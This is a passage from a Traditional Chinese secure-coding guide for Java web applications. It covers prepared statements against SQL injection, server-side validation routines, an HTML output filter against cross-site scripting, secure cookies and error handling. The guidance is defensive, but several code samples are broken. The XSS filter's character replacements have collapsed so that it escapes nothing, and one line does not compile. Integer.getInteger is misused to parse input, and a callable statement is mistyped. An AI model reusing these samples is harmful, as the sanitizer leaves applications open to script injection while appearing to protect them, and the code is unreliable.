  SqlDataAdapter myCommand = new SqlDataAdapter(selectCmd, myConnection);
  
  myCommand.SelectCommand.Parameters.Add(new SqlParameter("@username", SqlDbType.NVarChar, 20));
  myCommand.SelectCommand.Parameters["@username"].Value = UserNameField.Value;
</div><div></div><div>[2] 您可以利用驗證控制項，將輸入驗證新增到「Web 表單」頁面中。驗證控制項提供適用於標準驗證之所有一般類型的簡易使用機制（例如：測試日期是否有效，或值是否在範圍內），</div><div>以及用來提供自訂編寫驗證的方式。</div><div>此外，驗證控制項也可讓您完整自訂向使用者顯示錯誤資訊的方式。驗證控制項可以搭配「Web 表單」頁面類別檔所處理的任何控制項來使用，其中包括 HTML 和 Web 伺服器控制項。</div><div></div><div>如果要確定使用者輸入只包含有效值，您可以使用下列其中一個驗證控制項：</div><div></div><div>a. "RangeValidator"：檢查使用者的輸入（值）是否在指定的上下界限之間。</div><div>您可以檢查數字、英文字母和日期之配對內的範圍。</div><div></div><div>b. "RegularExpressionValidator"：檢查輸入是否符合正規表示式所定義的型樣。</div><div>這類型的驗證可讓您檢查可預期的字元序列，例如：社會保險號碼、電子郵件位址、電話號碼、郵遞區號等等中的字元序列。</div><div></div><div>重要注意事項：驗證控制項不會封鎖使用者輸入，或變更頁面處理流程；它們只會設定錯誤狀態，以及產生錯誤訊息。在執行進一步的應用程式專屬動作之前，程式設計師負責測試程式碼中的控制項狀態。</div><div></div><div>檢查使用者輸入有效性有兩種方式：</div><div></div><div>1. 測試一般錯誤狀態：</div><div></div><div>在您的程式碼中，測試頁面的 IsValid 內容。</div><div>這個內容會累積頁面上所有驗證控制項的 IsValid 內容值（使用邏輯 AND）。如果其中一個驗證控制項設為無效，頁面內容便會傳回 False。</div><div></div><div>2. 測試個別控制項的錯誤狀態：</div><div></div><div>在迴圈中處理頁面的驗證器集合，集合中含有指向所有驗證控制項的參照。</div><div>之後，您便可以檢查每個驗證控制項的 IsValid 內容。</div><div>** 備妥陳述式：</div><div></div><div>保護您的應用程式免於遭受 SQL 注入（亦即，惡意竄改 SQL 參數）有三種可能的方式。</div><div>請利用下列方式，而非動態建置 SQL 陳述式：</div><div></div><div>[1] PreparedStatement，經過前置編譯而存放在 PreparedStatement 物件儲存區中。</div><div>PreparedStatement 定義用來登錄輸入參數的設定元，輸入參數相容於支援的 JDBC SQL 資料類型。</div><div>例如，setString 應該用於 VARCHAR 或 LONGVARCHAR 類型的輸入參數（請參閱 Java API，以取得進一步的詳細資料）。</div><div>這個設定輸入參數的方式，可以防止攻擊者注入不正確的字元（如單引號）來操作 SQL 陳述式。</div><div></div><div>如何使用 J2EE 中之 PreparedStatement 的範例：</div><div></div><div>  // J2EE PreparedStatemenet Example
  // Get a connection to the database
  Connection myConnection;
  if (isDataSourceEnabled()) {
      // using the DataSource to get a managed connection
      Context ctx = new InitialContext();
      myConnection = ((DataSource)ctx.lookup(datasourceName)).getConnection(dbUserName, dbPassword);
  } else {
      try {
          // using the DriverManager to get a JDBC connection
          Class.forName(jdbcDriverClassPath);
          myConnection = DriverManager.getConnection(jdbcURL, dbUserName, dbPassword);
      } catch (ClassNotFoundException e) {
          ...
      }
  }
  ...
  try {
      PreparedStatement myStatement = myConnection.prepareStatement("select * from users where username = ?");
      myStatement.setString(1, userNameField);
      ResultSet rs = myStatement.executeQuery();
      ...
      rs.close();
  } catch (SQLException sqlException) {
      ...
  } finally {
      myStatement.close();
      myConnection.close();
  }
</div><div></div><div>[2] CallableStatement，延伸 PreparedStatement 來執行資料庫 SQL 儲存程序。</div><div>這個類別繼承 PreparedStatement 的輸入設定元（請參閱上面的 [1]）。</div><div></div><div>下列範例假設已建立好這個資料庫儲存程序：</div><div></div><div>CREATE PROCEDURE select_user (@username varchar(20))</div><div>AS SELECT * FROM USERS WHERE USERNAME = @username;</div><div></div><div>如何利用 J2EE 中的 CallableStatement 來執行上述儲存程序的範例：</div><div></div><div>  // J2EE PreparedStatemenet Example
  // Get a connection to the database
  Connection myConnection;
  if (isDataSourceEnabled()) {
      // using the DataSource to get a managed connection
      Context ctx = new InitialContext();
      myConnection = ((DataSource)ctx.lookup(datasourceName)).getConnection(dbUserName, dbPassword);
  } else {
      try {
          // using the DriverManager to get a JDBC connection
          Class.forName(jdbcDriverClassPath);
          myConnection = DriverManager.getConnection(jdbcURL, dbUserName, dbPassword);
      } catch (ClassNotFoundException e) {
          ...
      }
  }
  ...
  try {
      PreparedStatement myStatement = myConnection.prepareCall("{?= call select_user ?,?}");
      myStatement.setString(1, userNameField);
      myStatement.registerOutParameter(1, Types.VARCHAR);
      ResultSet rs = myStatement.executeQuery();
      ...
      rs.close();
  } catch (SQLException sqlException) {
      ...
  } finally {
      myStatement.close();
      myConnection.close();
  }
</div><div></div><div>[3] Entity Bean，在持續性儲存庫機制中代表 EJB 商業物件。</div><div>Entity Bean 有兩種類型：Bean 管理和儲存器管理。</div><div>當使用 Bean 管理的持續性時，開發人員負責撰寫存取資料庫的 SQL 程式碼（請參閱上述 [1] 和 [2] 區段）。</div><div>當使用儲存器管理的持續性時，EJB 儲存器會自動產生 SQL 程式碼。</div><div>因此，儲存器要負責防止惡意嘗試竄改產生的 SQL 程式碼。</div><div></div><div>如何使用 J2EE 中之 Entity Bean 的範例：</div><div></div><div>  // J2EE EJB Example
  try {
      // lookup the User home interface
      UserHome userHome = (UserHome)context.lookup(User.class);    
      // find the User remote interface
      User = userHome.findByPrimaryKey(new UserKey(userNameField));    
      ...    
  } catch (Exception e) {
      ...
  }
</div><div></div><div>建議的 Java 工具</div><div>N/A</div><div></div><div>參照</div><a href="https://docs.oracle.com/javase/7/docs/api/java/sql/PreparedStatement.html">https://docs.oracle.com/javase/7/docs/api/java/sql/PreparedStatement.html</a><br /><a href="https://docs.oracle.com/javase/7/docs/api/java/sql/CallableStatement.html">https://docs.oracle.com/javase/7/docs/api/java/sql/CallableStatement.html</a><br /><div></div><div></div><div>** 驗證輸入資料：</div><div></div><div>雖然為了使用者的方便，可以在用戶端層提供資料驗證，但必須利用 Servlet，在伺服器層執行資料驗證。</div><div>用戶端驗證原本就不安全，因為它們可以輕易略過，例如：停用 JavaScript。</div><div></div><div>好的設計通常需要 Web 應用程式架構提供伺服器端公用程式常式來驗證下列項目：</div><div>[1] 必要欄位</div><div>[2] 欄位資料類型（依預設，所有 HTTP 要求參數都是 String）</div><div>[3] 欄位長度</div><div>[4] 欄位範圍</div><div>[5] 欄位選項</div><div>[6] 欄位型樣</div><div>[7] Cookie 值</div><div>[8] HTTP 回應</div><div></div><div>在實務中，好的做法是在 "Validator" 公用程式類別中將上述常式當作靜態方法來實作。下列各節說明範例驗證器類別</div><div></div><div>[1] 必要欄位</div><div>一律檢查確認欄位不是空值，欄位長度大於零，且不含在前端及尾端的空格。</div><div></div><div>如何驗證必要欄位的範例：</div><div>  // Java example to validate required fields
  public Class Validator {
      ...
      public static boolean validateRequired(String value) {
          boolean isFieldValid = false;
          if (value != null &amp;&amp; value.trim().length() &gt; 0) {
              isFieldValid = true;
          }
          return isFieldValid;
      }
      ...
  }
  ...
  String fieldValue = request.getParameter("fieldName");
  if (Validator.validateRequired(fieldValue)) {
      // fieldValue is valid, continue processing request
      ...
  }
</div><div></div><div>[2] 欄位資料類型</div><div>在 Web 應用程式中，所輸入的輸入參數設定不良。例如，所有 HTTP 要求參數或 Cookie 值都是 String 類型。開發人員負責確認輸入的資料類型正確。</div><div>請利用 Java 基本封套類別來檢查欄位值是否能安全轉換成所需要的基本資料類型。</div><div></div><div>如何驗證數值欄位（int 類型）的範例：</div><div></div><div>  // Java example to validate that a field is an int number
  public Class Validator {
      ...
      public static boolean validateInt(String value) {
          boolean isFieldValid = false;
          try {
              Integer.parseInt(value);
              isFieldValid = true;
          } catch (Exception e) {
              isFieldValid = false;
          }
          return isFieldValid;
      }
      ...
  }
  ...
  // check if the HTTP request parameter is of type int
  String fieldValue = request.getParameter("fieldName");
  if (Validator.validateInt(fieldValue)) {
      // fieldValue is valid, continue processing request
      ...
  }
</div><div></div><div>在實務中，好的做法是將所有 HTTP 要求參數轉換成它們的相關資料類型。例如，開發人員應該將要求參數的 "integerValue" 儲存在要求屬性中，再依照下列範例所示來使用它：</div><div></div><div>  // Example to convert the HTTP request parameter to a primitive wrapper data type
  // and store this value in a request attribute for further processing
  String fieldValue = request.getParameter("fieldName");
  if (Validator.validateInt(fieldValue)) {
      // convert fieldValue to an Integer
      Integer integerValue = Integer.getInteger(fieldValue);
      // store integerValue in a request attribute
      request.setAttribute("fieldName", integerValue);
  }
  ...
  // Use the request attribute for further processing
  Integer integerValue = (Integer)request.getAttribute("fieldName");
  ...
</div><div></div><div>應用程式應該處理的主要 Java 資料類型：</div><div>- Byte</div><div>- Short</div><div>- Integer</div><div>- Long</div><div>- Float</div><div>- Double</div><div>- Date</div><div></div><div>[3] 欄位長度</div><div>一律確定輸入參數（HTTP 要求參數或 Cookie 值）在長度下限及/或長度上限的範圍內。</div><div></div><div>驗證 userName 欄位的長度是否在 8-20 個字元之間的範例：</div><div></div><div>  // Example to validate the field length
  public Class Validator {
      ...
      public static boolean validateLength(String value, int minLength, int maxLength) {
          String validatedValue = value;
          if (!validateRequired(value)) {
              validatedValue = "";
          }
          return (validatedValue.length() &gt;= minLength &amp;&amp;
                      validatedValue.length() &lt;= maxLength);
      }
      ...
  }
  ...
  String userName = request.getParameter("userName");
  if (Validator.validateRequired(userName)) {
      if (Validator.validateLength(userName, 8, 20)) {
          // userName is valid, continue further processing
          ...
      }
  }
</div><div></div><div>[4] 欄位範圍</div><div>一律確定輸入參數在函數需求定義的範圍內。</div><div></div><div>驗證輸入 numberOfChoices 是否在 10-20 之間的範例：</div><div></div><div>  // Example to validate the field range
  public Class Validator {
      ...
      public static boolean validateRange(int value, int min, int max) {
          return (value &gt;= min &amp;&amp; value &lt;= max);
      }
      ...
  }
  ...
  String fieldValue = request.getParameter("numberOfChoices");
  if (Validator.validateRequired(fieldValue)) {
      if (Validator.validateInt(fieldValue)) {
          int numberOfChoices = Integer.parseInt(fieldValue);
          if (Validator.validateRange(numberOfChoices, 10, 20)) {
              // numberOfChoices is valid, continue processing request
              ...
          }
      }
  }
</div><div></div><div>[5] 欄位選項</div><div>Web 應用程式通常會向使用者呈現一組可供選擇的選項（例如：使用 SELECT HTML 標籤），但無法執行伺服器端驗證來確保所選的值是容許的選項之一。請記住，惡意的使用者可以輕易修改任何選項值。請一律對照函數需求所定義容許的選項來驗證所選的使用者值。</div><div></div><div>對照容許的選項清單來驗證使用者選項的範例：</div><div></div><div>  // Example to validate user selection against a list of options
  public Class Validator {
      ...
      public static boolean validateOption(Object[] options, Object value) {
          boolean isValidValue = false;
          try {
              List list = Arrays.asList(options);
              if (list != null) {
                  isValidValue = list.contains(value);
              }
          } catch (Exception e) {
          }
          return isValidValue;
      }
      ...
  }
  ...
  // Allowed options
  String[] options = {"option1", "option2", "option3");
  // Verify that the user selection is one of the allowed options
  String userSelection = request.getParameter("userSelection");
  if (Validator.validateOption(options, userSelection)) {
      // valid user selection, continue processing request
      ...
  }
</div><div></div><div>[6] 欄位型樣</div><div>一律檢查使用者輸入是否符合功能需求所定義的型樣。比方說，如果 userName 欄位只應接受英數字元，且不區分大小寫，請使用下列正規表示式：^[a-zA-Z0-9]*$</div><div></div><div>Java 1.3 或更早的版本不包括任何正規表示式套件。建議搭配 Java 1.3 來使用「Apache 正規表示式套件」（請參閱下列「資源」），以解決這項支援欠缺。執行正規表示式驗證的範例：</div><div></div><div>  // Example to validate that a given value matches a specified pattern
  // using the Apache regular expression package
  import org.apache.regexp.RE;
  import org.apache.regexp.RESyntaxException;
  public Class Validator {
      ...
      public static boolean matchPattern(String value, String expression) {
          boolean match = false;
          if (validateRequired(expression)) {
               RE r = new RE(expression);
               match = r.match(value);             
          }
          return match;
      }
      ...
  }
  ...
  // Verify that the userName request parameter is alpha-numeric
  String userName = request.getParameter("userName");
  if (Validator.matchPattern(userName, "^[a-zA-Z0-9]*$")) {
      // userName is valid, continue processing request
      ...
  }
</div><div></div><div>Java 1.4 引進了新的正規表示式套件 (java.util.regex)。以下是 Validator.matchPattern 的修正版，使用新的 Java 1.4 正規表示式套件：</div><div></div><div>  // Example to validate that a given value matches a specified pattern
  // using the Java 1.4 regular expression package
  import java.util.regex.Pattern;
  import java.util.regexe.Matcher;
  public Class Validator {
      ...
      public static boolean matchPattern(String value, String expression) {
          boolean match = false;
          if (validateRequired(expression)) {
              match = Pattern.matches(expression, value);
          }
          return match;
      }
      ...
  }
</div><div></div><div>[7] Cookie 值</div><div>請利用 javax.servlet.http.Cookie 物件來驗證 Cookie 值。依應用程式需求而定，相同的驗證規則（說明如上）也適用於 Cookie 值，例如：驗證必要的值、驗證長度，等等。</div><div></div><div>驗證必要 Cookie 值的範例：</div><div></div><div>  // Example to validate a required cookie value
  // First retrieve all available cookies submitted in the HTTP request
  Cookie[] cookies = request.getCookies();
  if (cookies != null) {
      // find the "user" cookie
      for (int i=0; i&lt;cookies.length; ++i) {
          if (cookies[i].getName().equals("user")) {
              // validate the cookie value
              if (Validator.validateRequired(cookies[i].getValue()) {
                  // valid cookie value, continue processing request
                  ...
              }
          }    
      }
  }
</div><div></div><div>[8] HTTP 回應</div><div>[8-1] 過濾使用者輸入</div><div>如果要保護應用程式免於遭受跨網站指令碼，請將機密字元轉換成對應的字元實體來消毒 HTML。以下是 HTML 區分字元：</div><div>&lt; &gt; " ' % ; ) ( &amp; +</div><div></div><div>將機密字元轉換成對應的字元實體來過濾指定字串的範例：</div><div></div><div>  // Example to filter sensitive data to prevent cross-site scripting
  public Class Validator {
      ...
      public static String filter(String value) {
          if (value == null) {
              return null;
          }        
          StringBuffer result = new StringBuffer(value.length());
          for (int i=0; i&lt;value.length(); ++i) {
              switch (value.charAt(i)) {
              case '&lt;':
                  result.append("&lt;");
                  break;
              case '&gt;': 
                  result.append("&gt;");
                  break;
              case '"': 
                  result.append(""");
                  break;
              case '\'': 
                  result.append("'");
                  break;
              case '%': 
                  result.append("%");
                  break;
              case ';': 
                  result.append(";");
                  break;
              case '(': 
                  result.append("(");
                  break;
              case ')': 
                  result.append(")");
                  break;
              case '&amp;': 
                  result.append("&amp;");
                  break;
              case '+':
                  result.append("+");
                  break;
              default:
                  result.append(value.charAt(i));
                  break;
          }        
          return result;
      }
      ...
  }
  ...
  // Filter the HTTP response using Validator.filter
  PrintWriter out = response.getWriter();
  // set output response
  out.write(Validator.filter(response));
  out.close();
</div><div></div><div>Java Servlet API 2.3 引進了「過濾器」，它支援截取及轉換 HTTP 要求或回應。</div><div></div><div>利用「Servlet 過濾器」，以 Validator.filter 來消毒回應的範例：</div><div></div><div>  // Example to filter all sensitive characters in the HTTP response using a Java Filter.
  // This example is for illustration purposes since it will filter all content in the response, including HTML tags!
  public class SensitiveCharsFilter implements Filter {
      ...
      public void doFilter(ServletRequest request,
                      ServletResponse response,
                      FilterChain chain)
              throws IOException, ServletException {
  
          PrintWriter out = response.getWriter();
          ResponseWrapper wrapper = new ResponseWrapper((HttpServletResponse)response);
          chain.doFilter(request, wrapper);
  
          CharArrayWriter caw = new CharArrayWriter();
          caw.write(Validator.filter(wrapper.toString()));
          
          response.setContentType("text/html");
          response.setContentLength(caw.toString().length());
          out.write(caw.toString());
          out.close();
      }
      ...
      public class CharResponseWrapper extends HttpServletResponseWrapper {
          private CharArrayWriter output;
  
          public String toString() {
              return output.toString();
          }
      
          public CharResponseWrapper(HttpServletResponse response){
              super(response);
              output = new CharArrayWriter();
          }
          
          public PrintWriter getWriter(){
              return new PrintWriter(output);
          }
      }
  } 
  
  }
</div><div></div><div>[8-2] 維護 Cookie 安全</div><div>當機密資料儲存在 Cookie 中，請務必利用 Cookie.setSecure（布林旗標），在 HTTP 回應中設定 Cookie 的安全旗標，以指示瀏覽器利用 HTTPS 或 SSL 之類的安全通訊協定來傳送 Cookie。</div><div></div><div>維護 "user" Cookie 安全的範例：</div><div></div><div>  // Example to secure a cookie, i.e. instruct the browser to
  // send the cookie using a secure protocol
  Cookie cookie = new Cookie("user", "sensitive");
  cookie.setSecure(true);
  response.addCookie(cookie);
</div><div></div><div>建議的 Java 工具</div><div>適用於伺服器端驗證的兩個主要的 Java 架構如下：</div><div>[1] Jakarta 一般驗證器（整合 Struts 1.1）</div><div>「Jakarta 一般驗證器」實作上述所有資料驗證需求，是一個功能強大的架構。這些規則配置在定義表單欄位輸入驗證規則的 XML 檔中。依預設，Struts 支援在利用 Struts 'bean:write' 標籤撰寫的所有資料上，過濾 [8] HTTP 回應中輸出的危險字元。設定 'filter=false' 旗標可以停用這個過濾。</div><div></div><div>Struts 定義下列基本輸入驗證器，但也可以定義自訂驗證器：</div><div>required：如果欄位含有空格以外的任何字元，便告成功。</div><div>mask：如果值符合 mask 屬性給定的正規表示式，便告成功。</div><div>range：如果值在 min 和 max 屬性給定的值範圍內（(value &gt;= min) 且 (value &lt;= max)），便告成功。</div><div>maxLength：如果欄位長度小於或等於 max 屬性，便告成功。</div><div>minLength：如果欄位長度大於或等於 min 屬性，便告成功。</div><div>byte、short、integer、long、float、double：如果值可以轉換成對應的基本類型，便告成功。</div><div>date：如果值代表有效日期，便告成功。可提供日期型樣。</div><div>creditCard：如果值可能是有效的信用卡號碼，便告成功。</div><div>e-mail：如果值可能是有效的電子郵件位址，便告成功。</div><div></div><div>利用「Struts 驗證器」驗證 loginForm 之 userName 欄位的範例：</div><div>  &lt;form-validation&gt;
      &lt;global&gt;
          ...
          &lt;validator name="required"
              classname="org.apache.struts.validator.FieldChecks"
              method="validateRequired"
              msg="errors.required"&gt;
          &lt;/validator&gt;
          &lt;validator name="mask"
              classname="org.apache.struts.validator.FieldChecks"
              method="validateMask"
              msg="errors.invalid"&gt;
          &lt;/validator&gt;
          ...
      &lt;/global&gt;
      &lt;formset&gt;
          &lt;form name="loginForm"&gt;
              &lt;!-- userName is required and is alpha-numeric case insensitive --&gt;
              &lt;field property="userName" depends="required,mask"&gt;
                  &lt;!-- message resource key to display if validation fails --&gt;
                  &lt;msg name="mask" key="login.userName.maskmsg"/&gt;
                  &lt;arg0 key="login.userName.displayname"/&gt;
                  &lt;var&gt;
                      &lt;var-name&gt;mask&lt;/var-name&gt;
                      &lt;var-value&gt;^[a-zA-Z0-9]*$&lt;/var-value&gt;
                  &lt;/var&gt;
              &lt;/field&gt;
          ...
          &lt;/form&gt;
          ...
      &lt;/formset&gt;
  &lt;/form-validation&gt;
</div><div></div><div>[2] JavaServer Faces 技術</div><div>「JavaServer Faces 技術」是一組代表使用者介面元件、管理元件狀態、處理事件及輸入驗證的 Java API (JSR 127)。</div><div></div><div>JavaServer Faces API 實作下列基本驗證器，但可以定義自訂驗證器：</div><div>validate_doublerange：登錄元件的 DoubleRangeValidator</div><div>validate_length：登錄元件的 LengthValidator</div><div>validate_longrange：登錄元件的 LongRangeValidator</div><div>validate_required：登錄元件的 RequiredValidator</div><div>validate_stringrange：登錄元件的 StringRangeValidator</div><div>validator：登錄元件的自訂 Validator</div><div></div><div>JavaServer Faces API 定義下列 UIInput 和 UIOutput 展現器（標籤）：</div><div>input_date：接受以 java.text.Date 實例格式化的 java.util.Date</div><div>output_date：顯示以 java.text.Date 實例格式化的 java.util.Date</div><div>input_datetime：接受以 java.text.Time 實例格式化的 java.util.Date</div><div>output_datetime：顯示以 java.text.Time 實例格式化的 java.util.Date</div><div>input_number：顯示以 java.text.NumberFormat 格式化的數值資料類型（java.lang.Number 或基本資料類型）</div><div>output_number：顯示以 java.text.NumberFormat 格式化的數值資料類型（java.lang.Number 或基本資料類型）</div><div>input_text：接受單行字串。</div><div>output_text：顯示單行字串。</div><div>input_time：接受以 java.text.DateFormat 時間實例格式化的 java.util.Date</div><div>output_time：顯示以 java.text.DateFormat 時間實例格式化的 java.util.Date</div><div>input_hidden：可讓頁面作者將隱藏變數併入頁面</div><div>input_secret：接受不含空格的單行文字，輸入之時，將它顯示成一組星號</div><div>input_textarea：接受多行文字</div><div>output_errors：顯示整個頁面的錯誤訊息，或指定之用戶端 ID 的相關錯誤訊息</div><div>output_label：將巢狀元件顯示為指定輸入欄位的標籤</div><div>output_message：顯示本地化訊息</div><div></div><div>利用 JavaServer Faces 驗證 loginForm 之 userName 欄位的範例：</div><div>  &lt;%@ taglib uri="https://docs.oracle.com/javaee/6/tutorial/doc/glxce.html" prefix="h" %&gt;
  &lt;%@ taglib uri="http://mrbool.com/how-to-create-a-login-validation-with-jsf-java-server-faces/27046" prefix="f" %&gt;
  ...
  &lt;jsp:useBean id="UserBean"
      class="myApplication.UserBean" scope="session" /&gt;
  &lt;f:use_faces&gt;
    &lt;h:form formName="loginForm" &gt;
      &lt;h:input_text id="userName" size="20" modelReference="UserBean.userName"&gt;
          &lt;f:validate_required/&gt;
          &lt;f:validate_length minimum="8" maximum="20"/&gt;    
      &lt;/h:input_text&gt;
      &lt;!-- display errors if present --&gt;
      &lt;h:output_errors id="loginErrors" clientId="userName"/&gt;
      &lt;h:command_button id="submit" label="Submit" commandName="submit" /&gt;&lt;p&gt;
    &lt;/h:form&gt;
  &lt;/f:use_faces&gt;
</div><div></div><div></div><div>參照</div><div>Java API 1.3 - </div><a href="https://www.oracle.com/java/technologies/java-archive-13docs-downloads.html">https://www.oracle.com/java/technologies/java-archive-13docs-downloads.html</a><br /><div>Java API 1.4 - </div><a href="https://www.oracle.com/java/technologies/java-archive-142docs-downloads.html">https://www.oracle.com/java/technologies/java-archive-142docs-downloads.html</a><br /><div>Java Servlet API 2.3 - </div><a href="https://mvnrepository.com/artifact/javax.servlet/javax.servlet-api">https://mvnrepository.com/artifact/javax.servlet/javax.servlet-api</a><br /><div>Java 正規表示式套件 - </div><a href="http://jakarta.apache.org/regexp/">http://jakarta.apache.org/regexp/</a><br /><div>Jakarta 驗證器 - </div><a href="http://jakarta.apache.org/commons/validator/">http://jakarta.apache.org/commons/validator/</a><br /><div>JavaServer Faces 技術 - </div><a href="http://www.javaserverfaces.org/">http://www.javaserverfaces.org/</a><br /><div></div><div>** 錯誤處理：</div><div></div><div>許多 J2EE Web 應用程式架構都遵循「模型視圖控制器 (MVC)」型樣。在這個型樣中，Servlet 扮演控制器的角色。Servlet 將應用程式處理程序委派給 JavaBean，例如，EJB Session Bean（模型）。之後，Servlet 再將要求轉遞給 JSP（視圖）來呈現處理結果。Servlet 應該檢查所有輸入、輸出、回覆碼、錯誤碼及已知的異常狀況，以確保會實際進行預期的處理程序。</div><div></div><div>資料驗證可以保護應用程式免於遭受惡意的資料竄改，有效的錯誤處理策略則是防止應用程式意外揭露內部錯誤訊息（例如：異常狀況堆疊追蹤）所不可或缺。好的錯誤處理策略會處理下列項目：</div><div></div><div>[1] 定義錯誤</div><div>[2] 報告錯誤</div><div>[3] 呈現錯誤</div><div>[4] 錯誤對映</div><div></div><div>[1] 定義錯誤</div><div>應該避免將錯誤訊息寫在應用程式層（例如：Servlet）。相反地，應用程式應該使用對映至已知之應用程式失敗的錯誤索引鍵。在實務中，好的做法是定義錯誤索引鍵來對映至 HTML 表單欄位或其他 Bean 內容的驗證規則。比方說，如果需要 "user_name" 欄位，它必須是英數字元，且在資料庫中必須是唯一，便應該定義下列錯誤索引鍵：</div><div></div><div>(a) ERROR_USERNAME_REQUIRED：這個錯誤索引鍵用來顯示一則訊息，通知使用者需要 "user_name" 欄位；</div><div>(b) ERROR_USERNAME_ALPHANUMERIC：這個錯誤索引鍵用來顯示一則訊息，通知使用者 "user_name" 欄位應該是英數字元；</div><div>(c) ERROR_USERNAME_DUPLICATE：這個錯誤索引鍵用來顯示一則訊息，通知使用者 "user_name" 值在資料庫中重複；</div><div>(d) ERROR_USERNAME_INVALID：這個錯誤索引鍵用來顯示一則一般訊息，通知使用者 "user_name" 值無效；</div><div></div><div>在實務中，好的做法是定義下列架構 Java 類別來儲存及報告應用程式錯誤：</div><div></div><div>- ErrorKeys：定義所有錯誤索引鍵</div><div></div><div>      // Example: ErrorKeys defining the following error keys:    
      //    - ERROR_USERNAME_REQUIRED
      //    - ERROR_USERNAME_ALPHANUMERIC
      //    - ERROR_USERNAME_DUPLICATE
      //    - ERROR_USERNAME_INVALID
      //    ...
      public Class ErrorKeys {
          public static final String ERROR_USERNAME_REQUIRED = "error.username.required";
          public static final String ERROR_USERNAME_ALPHANUMERIC = "error.username.alphanumeric";
          public static final String ERROR_USERNAME_DUPLICATE = "error.username.duplicate";
          public static final String ERROR_USERNAME_INVALID = "error.username.invalid";
          ...
      }
</div><div></div><div>- Error：封裝個別錯誤</div><div></div><div>      // Example: Error encapsulates an error key.
      // Error is serializable to support code executing in multiple JVMs.
      public Class Error implements Serializable {
          
          // Constructor given a specified error key
          public Error(String key) {
              this(key, null);
          }
          
          // Constructor given a specified error key and array of placeholder objects
          public Error(String key, Object[] values) {
              this.key = key;
              this.values = values;
          }
          
          // Returns the error key
          public String getKey() {
              return this.key;
          }
          
          // Returns the placeholder values
          public Object[] getValues() {
              return this.values;
          }
          
          private String key = null;
          private Object[] values = null;
      }    
</div><div></div><div>- Errors：封裝錯誤的集合</div><div></div><div>      // Example: Errors encapsulates the Error objects being reported to the presentation layer.
      // Errors are stored in a HashMap where the key is the bean property name and value is an
      // ArrayList of Error objects.
      public Class Errors implements Serializable {
      
          // Adds an Error object to the Collection of errors for the specified bean property.
          public void addError(String property, Error error) {
              ArrayList propertyErrors = (ArrayList)errors.get(property);
              if (propertyErrors == null) {
                  propertyErrors = new ArrayList();
                  errors.put(property, propertyErrors);
              }
              propertyErrors.put(error);            
          }
          
          // Returns true if there are any errors
          public boolean hasErrors() {
              return (errors.size &gt; 0);
          }
          
          // Returns the Errors for the specified property
          public ArrayList getErrors(String property) {
              return (ArrayList)errors.get(property);
          }
  
          private HashMap errors = new HashMap();
      }
</div><div></div><div>以下是利用上述架構類別來處理 "user_name" 欄位驗證錯誤的範例：</div><div></div><div>  // Example to process validation errors of the "user_name" field.
  Errors errors = new Errors();
  String userName = request.getParameter("user_name");
  // (a) Required validation rule
  if (!Validator.validateRequired(userName)) {
      errors.addError("user_name", new Error(ErrorKeys.ERROR_USERNAME_REQUIRED));
  } // (b) Alpha-numeric validation rule
  else if (!Validator.matchPattern(userName, "^[a-zA-Z0-9]*$")) {
      errors.addError("user_name", new Error(ErrorKeys.ERROR_USERNAME_ALPHANUMERIC));
  }
  else
  {
      // (c) Duplicate check validation rule
      // We assume that there is an existing UserValidationEJB session bean that implements
      // a checkIfDuplicate() method to verify if the user already exists in the database.
      try {
          ...        
          if (UserValidationEJB.checkIfDuplicate(userName)) {
              errors.addError("user_name", new Error(ErrorKeys.ERROR_USERNAME_DUPLICATE));
          }
      } catch (RemoteException e) {
          // log the error
          logger.error("Could not validate user for specified userName: " + userName);
          errors.addError("user_name", new Error(ErrorKeys.ERROR_USERNAME_DUPLICATE);
      }
  }
  // set the errors object in a request attribute called "errors"
  request.setAttribute("errors", errors);
  ...
</div><div></div><div>[2] 報告錯誤</div><div>報告 Web 層應用程式錯誤的方式有兩種：</div><div>(a) Servlet 錯誤機制</div><div>(b) JSP 錯誤機制</div><div></div><div>[2-a] Servlet 錯誤機制</div><div>Servlet 報告錯誤的可能方式如下：</div><div>- 轉遞至輸入 JSP（已將錯誤儲存在要求屬性中），或</div><div>- 利用 HTTP 錯誤碼引數來呼叫 response.sendError，或</div><div>- 擲出異常狀況</div><div></div><div>在實務中，好的做法是處理所有已知的應用程式錯誤（依照 [1] 區段所說明），將它們儲存在要求屬性中，再轉遞給輸入 JSP。輸入 JSP 應該顯示錯誤訊息，並提示使用者重新輸入資料。下列範例說明如何轉遞到輸入 JSP (userInput.jsp)：</div><div></div><div>  // Example to forward to the userInput.jsp following user validation errors
  RequestDispatcher rd = getServletContext().getRequestDispatcher("/user/userInput.jsp");
  if (rd != null) {
      rd.forward(request, response);
  }
</div><div></div><div>如果 Servlet 無法轉遞到已知的 JSP 頁面，第二個選項是利用 response.sendError 方法，設定 HttpServletResponse.SC_INTERNAL_SERVER_ERROR 引數（狀態碼 500）來報告錯誤。</div><div>請參閱 javax.servlet.http.HttpServletResponse javadoc，以取得各種 HTTP 狀態碼的詳細資訊。</div><div>傳回 HTTP 錯誤的範例：</div><div></div><div>  // Example to return a HTTP error code
  RequestDispatcher rd = getServletContext().getRequestDispatcher("/user/userInput.jsp");
  if (rd == null) {
      // messages is a resource bundle with all message keys and values
      response.sendError(HttpServletResponse.SC_INTERNAL_SERVER_ERROR,
                              messages.getMessage(ErrorKeys.ERROR_USERNAME_INVALID));
  }
</div><div></div><div>作為最後的手段，Servlet 可以擲出異常狀況，它必須是下列類別之一的子類別：</div><div>- RuntimeException</div><div>- ServletException</div><div>- IOException</div><div></div><div>[2-b] JSP 錯誤機制 JSP 頁面依照下列範例所示來定義 errorPage 指引，從而提供了執行時期異常狀況的處理機制：</div><div></div><div>      &lt;%@ page errorPage="/errors/userValidation.jsp" %&gt;
</div><div></div><div>未捕捉的 JSP 異常狀況是轉遞到指定的 errorPage，而原始異常狀況則設在稱為 javax.servlet.jsp.jspException 的要求參數中。錯誤頁面必須包含 isErrorPage 指引，如下所示：</div><div></div><div>      &lt;%@ page isErrorPage="true" %&gt;
</div><div></div><div>isErrorPage 指引會使 "exception" 變數起始設定為所擲出的異常狀況物件。</div><div></div><div>[3] 呈現錯誤</div><div>J2SE Internationalization API 提供用來提出應用程式資源以及將訊息格式化的公用程式類別，其中包括：</div><div></div><div>(a) 資源組</div><div>(b) 訊息格式化</div><div></div><div>[3-a] 資源組</div><div>資源組會將本地化的資料與使用它的原始碼分開，從而支援國際化。每個資源組都會儲存特定語言環境之鍵值配對的對映。</div><div></div><div>通常是利用或延伸 java.util.PropertyResourceBundle，它會將內容儲存在外部內容檔中，如下列範例所示：</div><div></div><div>  ################################################
